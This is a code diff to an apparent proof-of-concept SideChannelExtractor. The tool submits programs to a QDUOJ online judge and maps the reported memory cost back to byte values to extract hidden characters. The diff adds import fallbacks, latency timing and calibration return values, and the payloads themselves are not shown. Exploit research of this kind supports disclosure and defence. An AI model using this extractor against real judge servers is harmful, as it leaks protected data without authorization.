@@ -1,6 +1,10 @@
 import numpy as np
-from client import OJClient
-from payload import get_calibration_payload, get_character_extraction_payload, get_lcp_extraction_payload
+try:
+    from client import OJClient
+    from payload import get_calibration_payload, get_character_extraction_payload, get_lcp_extraction_payload
+except ImportError:
+    from poc.client import OJClient
+    from poc.payload import get_calibration_payload, get_character_extraction_payload, get_lcp_extraction_payload
 import time
 
 class SideChannelExtractor:
@@ -11,19 +15,21 @@ class SideChannelExtractor:
         self.intercept = 0
         self.is_calibrated = False
 
-    def submit_and_wait(self, code):
+    def submit_and_wait(self, code, return_latency=False):
         """Submit code and wait for the result to get memory cost."""
+        start_time = time.time()
         sub_id = self.client.submit(self.problem_id, code)
         if not sub_id:
-            return None
+            return (None, time.time() - start_time) if return_latency else None
         
         result = self.client.get_result(sub_id)
+        latency = time.time() - start_time
         if result:
             # QDUOJ stores the metrics in 'statistic_info' as 'memory_cost'
             stat_info = result.get('statistic_info', {})
             mem = stat_info.get('memory_cost', result.get('memory_cost', result.get('memory', -1)))
-            return mem
-        return -1
+            return (mem, latency) if return_latency else mem
+        return (-1, latency) if return_latency else -1
 
     def calibrate(self, points=[0, 128, 255]):
         """
@@ -59,8 +65,10 @@ class SideChannelExtractor:
             self.is_calibrated = True
             print(f"[+] Calibration complete.")
             print(f"[+] Model: y = {m} * x + {b}")
+            return x_memory, y_val
         else:
             print("[-] Calibration failed. Not enough valid data points.")
+            return [], []
 
     def memory_to_val(self, memory_cost):
         """Map a memory cost back to a `val` (0-255)."""
